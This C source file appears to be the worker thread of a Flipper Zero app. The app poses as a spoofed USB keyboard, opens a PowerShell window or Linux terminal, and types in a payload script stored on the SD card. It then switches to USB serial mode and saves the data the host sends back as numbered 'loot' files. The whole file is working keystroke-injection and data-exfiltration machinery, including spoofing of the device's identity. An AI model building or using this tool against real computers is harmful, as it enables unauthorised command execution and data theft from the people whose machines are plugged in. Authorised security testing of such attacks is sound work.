#include "zero_buster_worker.h"
#include "zero_buster_hid.h"
#include "zero_buster_storage.h"

/* Release USB resources and restore normal system USB (CLI and qFlipper) */
void zero_buster_release_usb(ZeroBusterApp* app) {
    if(!app) return;

    // 1. Clear our custom CDC callbacks
    furi_hal_cdc_set_callbacks(0, NULL, NULL);

    // 2. Hardware USB disconnect: pull down D+ line so the host OS detects a true
    // physical unplug, forcibly clearing stale COM handles in host drivers (usbser.sys/cdc_acm)
    // and resetting qFlipper's internal session monitor
    furi_hal_usb_disable();
    furi_delay_ms(250);

    // 3. Restore previous USB configuration (default Flipper USB)
    if(app->prev_usb_config) {
        furi_hal_usb_set_config(app->prev_usb_config, NULL);
    }

    // 4. Hardware USB reconnect: re-engage pull-up so the host enumerates a fresh device
    furi_hal_usb_enable();
    furi_delay_ms(150);

    // 5. Force USB re-initialization to reset PHY endpoints and hardware FIFOs
    furi_hal_usb_reinit();
    furi_delay_ms(100);

    // 6. Cycle CLI VCP disable -> enable to re-register clean RPC/CLI callbacks
    if(app->cli_vcp) {
        cli_vcp_disable(app->cli_vcp);
        cli_vcp_enable(app->cli_vcp);
    }
}

/* CDC RX callback: signals the worker thread when packets arrive */
static void zero_buster_cdc_rx_callback(void* context) {
    ZeroBusterApp* app = context;
    if(app && app->worker_thread) {
        furi_thread_flags_set(furi_thread_get_id(app->worker_thread), WORKER_FLAG_RX);
    }
}

static const CdcCallbacks zero_buster_cdc_callbacks = {
    .tx_ep_callback = NULL,
    .rx_ep_callback = zero_buster_cdc_rx_callback,
    .state_callback = NULL,
    .ctrl_line_callback = NULL,
    .config_callback = NULL,
};

/* Worker thread */
int32_t zero_buster_worker_thread(void* context) {
    ZeroBusterApp* app = context;
    furi_assert(app);

    FURI_LOG_I(TAG, "Worker thread started");

    // 1. Configure and enable USB HID with Spoofed Device Profile
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->state = State_HID_Connecting;
    app->bytes_received = 0;
    app->packets_received = 0;
    app->current_file[0] = '\0';
    furi_mutex_release(app->mutex);
    view_port_update(app->view_port);

    FuriHalUsbHidConfig current_hid_cfg;
    if(app->spoof_profile == Spoof_Custom) {
        current_hid_cfg = app->custom_hid_cfg;
    } else {
        current_hid_cfg = spoof_configs[app->spoof_profile];
    }
    furi_hal_usb_set_config(&usb_hid, &current_hid_cfg);

    // Wait for USB connection
    uint32_t hid_wait = 0;
    while(!furi_hal_hid_is_connected() && !app->worker_stop && hid_wait < 60) {
        furi_delay_ms(100);
        hid_wait++;
    }

    if(app->worker_stop) {
        zero_buster_release_usb(app);
        return 0;
    }
    furi_delay_ms(600);

    // 2. Read selected payload from MicroSD
    char payload_path[64];
    snprintf(
        payload_path,
        sizeof(payload_path),
        "%s/%s",
        PAYLOAD_DIR,
        app->payloads.names[app->payloads.selected_index]);

    char* payload_buf = malloc(PAYLOAD_BUF_SIZE);
    memset(payload_buf, 0, PAYLOAD_BUF_SIZE);

    File* pf = storage_file_alloc(app->storage);
    bool payload_read_ok = false;
    if(storage_file_open(pf, payload_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        uint16_t bytes_read = storage_file_read(pf, payload_buf, PAYLOAD_BUF_SIZE - 1);
        if(bytes_read > 0) {
            payload_buf[bytes_read] = '\0';
            payload_read_ok = true;
        }
        storage_file_close(pf);
    }
    storage_file_free(pf);

    if(!payload_read_ok) {
        free(payload_buf);
        zero_buster_release_usb(app);
        furi_mutex_acquire(app->mutex, FuriWaitForever);
        app->state = State_Error;
        snprintf(app->error_msg, sizeof(app->error_msg), "Failed to read payload");
        furi_mutex_release(app->mutex);
        view_port_update(app->view_port);
        return -1;
    }

    // 3. Inject Keystrokes
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->state = State_Injecting;
    furi_mutex_release(app->mutex);
    view_port_update(app->view_port);

    const char* cur_name = app->payloads.names[app->payloads.selected_index];
    bool is_windows = (strstr(cur_name, "win") != NULL) || (strstr(cur_name, ".ps1") != NULL);

    if(is_windows) {
        // Win + R
        furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
        furi_delay_ms(50);
        furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
        furi_delay_ms(800);

        if(app->worker_stop) {
            free(payload_buf);
            zero_buster_release_usb(app);
            return 0;
        }

        // Open Powershell (console window with keyboard focus, bypassing Run dialog length limit)
        zero_buster_type_string("powershell -NoP", app->layout, 12, &app->worker_stop);
        furi_delay_ms(50);
        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(50);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        furi_delay_ms(1500);

        if(app->worker_stop) {
            free(payload_buf);
            zero_buster_release_usb(app);
            return 0;
        }

        // Type script content directly into the PowerShell prompt
        zero_buster_type_string(payload_buf, app->layout, 12, &app->worker_stop);
        furi_delay_ms(50);

        if(app->worker_stop) {
            free(payload_buf);
            zero_buster_release_usb(app);
            return 0;
        }

        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(50);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
    } else {
        // Linux: Ctrl + Alt + T
        furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
        furi_delay_ms(50);
        furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
        furi_delay_ms(800);

        if(app->worker_stop) {
            free(payload_buf);
            zero_buster_release_usb(app);
            return 0;
        }

        // Type script content
        zero_buster_type_string(payload_buf, app->layout, 12, &app->worker_stop);
        furi_delay_ms(50);

        if(app->worker_stop) {
            free(payload_buf);
            zero_buster_release_usb(app);
            return 0;
        }

        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(50);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
    }

    free(payload_buf);
    if(app->worker_stop) {
        zero_buster_release_usb(app);
        return 0;
    }
    furi_delay_ms(500);
    if(app->worker_stop) {
        zero_buster_release_usb(app);
        return 0;
    }

    // 4. Switch to USB CDC Serial mode
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->state = State_Switching_CDC;
    furi_mutex_release(app->mutex);
    view_port_update(app->view_port);

    // Disable cli_vcp while we take over CDC channel 0
    if(app->cli_vcp) {
        cli_vcp_disable(app->cli_vcp);
    }

    // Set CDC single mode
    furi_hal_usb_set_config(&usb_cdc_single, NULL);
    furi_delay_ms(400);

    if(app->worker_stop) {
        zero_buster_release_usb(app);
        return 0;
    }

    // 5. Open Loot File BEFORE enabling CDC callbacks so no incoming data is dropped
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->state = State_Receiving;
    get_next_loot_filepath(app->storage, app->current_file, sizeof(app->current_file));
    furi_mutex_release(app->mutex);
    view_port_update(app->view_port);

    if(app->worker_stop) {
        zero_buster_release_usb(app);
        return 0;
    }

    File* file = storage_file_alloc(app->storage);
    bool file_opened = storage_file_open(file, app->current_file, FSAM_WRITE, FSOM_CREATE_ALWAYS);

    if(!file_opened) {
        zero_buster_release_usb(app);
        furi_mutex_acquire(app->mutex, FuriWaitForever);
        app->state = State_Error;
        snprintf(app->error_msg, sizeof(app->error_msg), "SD Card Write Error");
        furi_mutex_release(app->mutex);
        storage_file_free(file);
        view_port_update(app->view_port);
        return -1;
    }

    // Flush and register our CDC RX callback now that file is ready
    furi_hal_cdc_set_callbacks(0, (CdcCallbacks*)&zero_buster_cdc_callbacks, app);

    // 6. Receive Serial Loop (drain all available packets in a loop)
    uint8_t rx_buffer[128];
    uint32_t timeout_counter = 0;
    bool eof_received = false;

    // Generous initial wait (up to 60s) for slow host script startup, 20s between packets
    while(!app->worker_stop) {
        uint32_t max_timeout = (app->bytes_received == 0) ? 1200 : 400;
        if(timeout_counter >= max_timeout) {
            break;
        }

        uint32_t flags = furi_thread_flags_wait(WORKER_FLAG_RX, FuriFlagWaitAny, 50);
        UNUSED(flags);

        int32_t len;
        bool had_data = false;
        while((len = furi_hal_cdc_receive(0, rx_buffer, sizeof(rx_buffer) - 1)) > 0) {
            had_data = true;
            timeout_counter = 0;
            rx_buffer[len] = '\0';

            char* eof_ptr = strstr((char*)rx_buffer, EOF_MARKER);
            if(eof_ptr) {
                int32_t data_len = eof_ptr - (char*)rx_buffer;
                if(data_len > 0) {
                    storage_file_write(file, rx_buffer, data_len);
                    app->bytes_received += data_len;
                }
                eof_received = true;
                break;
            } else {
                storage_file_write(file, rx_buffer, len);
                app->bytes_received += len;
                app->packets_received++;
                view_port_update(app->view_port);
            }
        }

        if(eof_received) {
            break;
        }

        if(!had_data) {
            timeout_counter++;
        }
    }

    storage_file_close(file);
    storage_file_free(file);

    // 7. Free and restore USB back to system (qFlipper / CLI) immediately
    zero_buster_release_usb(app);

    // 8. Final State
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    if(app->worker_stop) {
        // User cancelled: delete the loot file so no empty or partial loot file is created
        if(app->current_file[0] != '\0') {
            storage_simply_remove(app->storage, app->current_file);
            app->current_file[0] = '\0';
        }
        app->state = State_Idle;
    } else if(eof_received || app->bytes_received > 0) {
        app->state = State_Completed;
        notification_message(app->notifications, &sequence_success);
    } else {
        // Timeout with 0 bytes: clean up empty loot file
        if(app->current_file[0] != '\0') {
            storage_simply_remove(app->storage, app->current_file);
            app->current_file[0] = '\0';
        }
        app->state = State_Error;
        snprintf(app->error_msg, sizeof(app->error_msg), "Timeout: No CDC Data");
        notification_message(app->notifications, &sequence_error);
    }
    furi_mutex_release(app->mutex);
    view_port_update(app->view_port);

    return 0;
}
